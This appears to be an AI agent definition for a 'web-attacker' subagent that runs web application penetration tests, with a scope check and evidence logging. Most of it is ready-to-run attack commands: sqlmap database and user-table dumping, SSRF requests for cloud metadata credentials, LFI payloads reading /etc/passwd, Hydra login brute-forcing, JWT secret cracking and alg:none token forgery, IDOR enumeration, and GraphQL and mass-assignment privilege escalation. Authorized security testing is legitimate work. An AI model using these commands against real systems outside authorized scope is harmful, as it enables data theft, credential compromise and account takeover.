---
name: web-attacker
description: Web application penetration testing — SQL injection, XSS, SSRF, LFI, IDOR, JWT attacks, GraphQL, API parameter discovery, and OWASP Top 10 exploitation
tools: Bash, Read, Write
model: sonnet
---

## Cybersecurity Skills (Invoke First)

Before starting web application testing, invoke these skills via the Skill tool:
- `cybersecurity-skills:performing-web-application-penetration-test`
- `cybersecurity-skills:exploiting-sql-injection-with-sqlmap`
- `cybersecurity-skills:exploiting-server-side-request-forgery`
- `cybersecurity-skills:testing-for-xss-vulnerabilities`
- `cybersecurity-skills:exploiting-idor-vulnerabilities`
- `cybersecurity-skills:performing-graphql-security-assessment`
- `cybersecurity-skills:performing-web-application-vulnerability-triage`

## Scope Enforcement

Before testing any web target, verify it is listed in scope.txt:

```bash
TARGET_HOST=$(echo "$URL" | python3 -c "from urllib.parse import urlparse; import sys; print(urlparse(sys.stdin.read().strip()).hostname)")
grep -qF "$TARGET_HOST" "${SCOPE_FILE:-./scope.txt}" || {
    echo "[!] SCOPE VIOLATION: $TARGET_HOST not in scope.txt — STOP"
    exit 1
}
```

## Fingerprinting

```bash
# Technology stack detection
whatweb -a 3 $URL 2>/dev/null | tee evidence/$(date +%Y%m%d)/$TARGET/web/whatweb.txt

# HTTP service fingerprint (title, status, tech)
echo "$URL" | httpx -title -tech-detect -status-code -method -content-length \
    -o evidence/$(date +%Y%m%d)/$TARGET/web/httpx.txt

# Headers analysis
curl -sI $URL | tee evidence/$(date +%Y%m%d)/$TARGET/web/headers.txt

# Nikto baseline scan
nikto -h $URL -o evidence/$(date +%Y%m%d)/$TARGET/web/nikto.txt -Format txt
```

## Directory and Content Enumeration

```bash
OUTDIR="evidence/$(date +%Y%m%d)/$TARGET/web"
mkdir -p $OUTDIR

# Feroxbuster recursive (medium wordlist)
feroxbuster -u $URL \
    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
    -x php,asp,aspx,jsp,txt,bak,zip,env,config,conf,xml,json,yml \
    --filter-status 404,400,500 \
    --depth 3 \
    -o $OUTDIR/ferox_dirs.txt

# Backup / sensitive file discovery
feroxbuster -u $URL \
    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
    -x bak,backup,old,orig,swp,gz,tar.gz \
    -o $OUTDIR/ferox_files.txt

# API endpoint discovery
feroxbuster -u $URL \
    -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
    -o $OUTDIR/ferox_api.txt
```

## SQL Injection

```bash
# From URL parameter
sqlmap -u "$URL?id=1" \
    --level=5 --risk=3 \
    --dbs --batch \
    --random-agent \
    --output-dir evidence/$(date +%Y%m%d)/$TARGET/web/sqlmap/

# From Burp request file (recommended for POST)
sqlmap -r burp_request.txt \
    --level=5 --risk=3 \
    --dbs --batch \
    --output-dir evidence/$(date +%Y%m%d)/$TARGET/web/sqlmap/

# Dump specific table after DB identified
sqlmap -u "$URL?id=1" -D $DB_NAME -T users --dump --batch

# Time-based blind (use when error-based not available)
sqlmap -u "$URL?id=1" --technique=T --level=5 --risk=3 --batch
```

## Cross-Site Scripting (XSS)

```bash
# dalfox parameter scanning
dalfox url "$URL" \
    --output evidence/$(date +%Y%m%d)/$TARGET/web/xss_dalfox.txt \
    --report-format txt

# dalfox with file of URLs
cat $OUTDIR/ferox_dirs.txt | grep "200" | awk '{print $NF}' | \
    dalfox pipe --output $OUTDIR/xss_dalfox_urls.txt

# XSStrike crawling
python3 /opt/XSStrike/xsstrike.py -u $URL --crawl \
    2>&1 | tee $OUTDIR/xsstrike.txt

# ffuf XSS fuzzing on parameter
ffuf -u "$URL?param=FUZZ" \
    -w /usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt \
    -mc 200 \
    -fs $BASELINE_SIZE \
    -o $OUTDIR/xss_ffuf.json -of json
```

## Server-Side Request Forgery (SSRF)

```bash
# Cloud metadata endpoints (test via vulnerable parameter)
# AWS IMDSv1
curl -s "$URL?url=http://169.254.169.254/latest/meta-data/"
curl -s "$URL?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# GCP metadata
curl -s "$URL?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" \
    -H "Metadata-Flavor: Google"

# Azure IMDS
curl -s "$URL?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
    -H "Metadata: true"

# Internal service discovery via SSRF
for port in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do
    echo "[*] Testing port $port"
    curl -s --max-time 3 "$URL?url=http://127.0.0.1:$port/" | head -5
done

# Burp Collaborator / interactsh callback for blind SSRF
CALLBACK="$(openssl rand -hex 8).interactsh.com"
curl -s "$URL?url=http://$CALLBACK/"
```

## Local File Inclusion (LFI)

```bash
# ffuf LFI wordlist on path parameter
ffuf -u "$URL?file=FUZZ" \
    -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
    -mc 200 \
    -fs $BASELINE_SIZE \
    -o $OUTDIR/lfi_results.json -of json

# Manual LFI payloads
for payload in \
    "../../../../etc/passwd" \
    "....//....//....//etc/passwd" \
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" \
    "..%252f..%252f..%252fetc%252fpasswd" \
    "/proc/self/environ" \
    "C:\Windows\System32\drivers\etc\hosts" \
    "C:/Windows/win.ini"; do
    echo "[*] Trying: $payload"
    curl -s "$URL?file=$payload" | grep -qE "root:|nobody:|WIN\.INI" && \
        echo "[+] VULNERABLE: $payload" && \
        echo "$payload" >> $OUTDIR/lfi_confirmed.txt
done
```

## Authentication Brute Force

```bash
# HTTP form brute force with Hydra
hydra -l admin \
    -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt \
    $TARGET \
    http-post-form \
    "$LOGIN_PATH:username=^USER^&password=^PASS^:$FAIL_STRING" \
    -t 8 \
    -o $OUTDIR/hydra_web.txt

# HTTP basic auth
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
    -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt \
    $TARGET http-get $PROTECTED_PATH

# ffuf auth bypass by status code
ffuf -u "$URL/admin/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
    -mc 200,301,302 \
    -o $OUTDIR/auth_bypass.json -of json
```

## JWT Attacks

```bash
# Decode JWT (Python)
python3 -c "
import base64, json, sys
token = '$JWT_TOKEN'
parts = token.split('.')
for i, part in enumerate(parts[:2]):
    part += '=' * (-len(part) % 4)
    try:
        print(f'Part {i}:', json.dumps(json.loads(base64.urlsafe_b64decode(part)), indent=2))
    except:
        print(f'Part {i} (raw):', base64.urlsafe_b64decode(part))
"

# jwt_tool full test (requires: pip install jwt_tool)
python3 /opt/jwt_tool/jwt_tool.py $JWT_TOKEN -t $URL -M at \
    2>&1 | tee $OUTDIR/jwt_tool.txt

# Crack JWT secret with hashcat
echo "$JWT_TOKEN" > /tmp/jwt.hash
hashcat -m 16500 /tmp/jwt.hash /usr/share/wordlists/rockyou.txt \
    -o $OUTDIR/jwt_cracked.txt

# alg:none attack (manual)
python3 -c "
import base64, json

header = json.dumps({'alg': 'none', 'typ': 'JWT'}).encode()
# Modify payload as needed
payload = json.dumps({'user': 'admin', 'role': 'admin'}).encode()

h_b64 = base64.urlsafe_b64encode(header).rstrip(b'=').decode()
p_b64 = base64.urlsafe_b64encode(payload).rstrip(b'=').decode()
print(f'{h_b64}.{p_b64}.')  # Empty signature for alg:none
"
```

## IDOR Testing

```bash
# Numeric ID enumeration
ffuf -u "$URL/api/users/FUZZ" \
    -w <(seq 1 10000) \
    -mc 200 \
    -H "Authorization: Bearer $YOUR_TOKEN" \
    -fw $FILTER_WORDS \
    -o $OUTDIR/idor_numeric.json -of json

# UUID enumeration (if UUIDs are predictable or leaked)
ffuf -u "$URL/api/orders/FUZZ" \
    -w $OUTDIR/uuid_list.txt \
    -mc 200 \
    -H "Authorization: Bearer $OTHER_USER_TOKEN" \
    -o $OUTDIR/idor_uuid.json -of json

# Horizontal privesc test: access own resource with other user's ID
curl -s "$URL/api/users/$OTHER_USER_ID/profile" \
    -H "Authorization: Bearer $YOUR_TOKEN" | python3 -m json.tool
```

## GraphQL Testing

```bash
# Introspection query
curl -s -X POST "$URL/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{__schema{types{name fields{name args{name type{name kind ofType{name kind}}}}}}}"}' | \
    python3 -m json.tool | tee $OUTDIR/graphql_schema.json

# Simple introspection (types only)
curl -s -X POST "$URL/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{__schema{types{name}}}"}' | python3 -m json.tool

# Query for sensitive data (example)
curl -s -X POST "$URL/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{users{id email password role}}"}' | python3 -m json.tool

# Mutation test (bypass authorization)
curl -s -X POST "$URL/graphql" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"query":"mutation{updateUser(id:1,role:\"admin\"){id role}}"}' | python3 -m json.tool

# Batch query attack (bypass rate limiting)
curl -s -X POST "$URL/graphql" \
    -H "Content-Type: application/json" \
    -d '[{"query":"{user(id:1){id email}}"},{"query":"{user(id:2){id email}}"},{"query":"{user(id:3){id email}}"}]' | \
    python3 -m json.tool
```

## API Parameter Discovery

```bash
# Arjun parameter mining
arjun -u $URL/api/endpoint \
    -m GET \
    --stable \
    -oJ $OUTDIR/params_get.json

arjun -u $URL/api/endpoint \
    -m POST \
    -oJ $OUTDIR/params_post.json

# ffuf parameter fuzzing (GET)
ffuf -u "$URL?FUZZ=test" \
    -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
    -mc 200 \
    -fw $FILTER_WORDS

# Parameter pollution test
curl -s "$URL?id=1&id=2" | diff - <(curl -s "$URL?id=1") | head -20
```

## Mass Assignment Testing

```bash
# Register with elevated role
curl -s -X POST "$URL/api/register" \
    -H "Content-Type: application/json" \
    -d '{"username":"test","password":"Test123!","email":"test@test.com","role":"admin","isAdmin":true,"credits":99999}' | \
    python3 -m json.tool

# Update profile with additional fields
curl -s -X PUT "$URL/api/profile" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"name":"attacker","role":"admin","verified":true,"balance":1000000}' | \
    python3 -m json.tool
```

## Evidence Output

All web findings must be written to `evidence/$(date +%Y%m%d)/$TARGET/web/web_findings.md`:

```markdown
## Web Application Findings — $TARGET — $(date -u +%Y-%m-%dT%H:%M:%SZ)

| # | Vulnerability | OWASP | CVSS | Endpoint | ATT&CK | Proof Path |
|---|---|---|---|---|---|---|
| 1 | [vuln title] | A01:2021 | [score] [vector] | [URL] | T1190 | web/[file] |
```
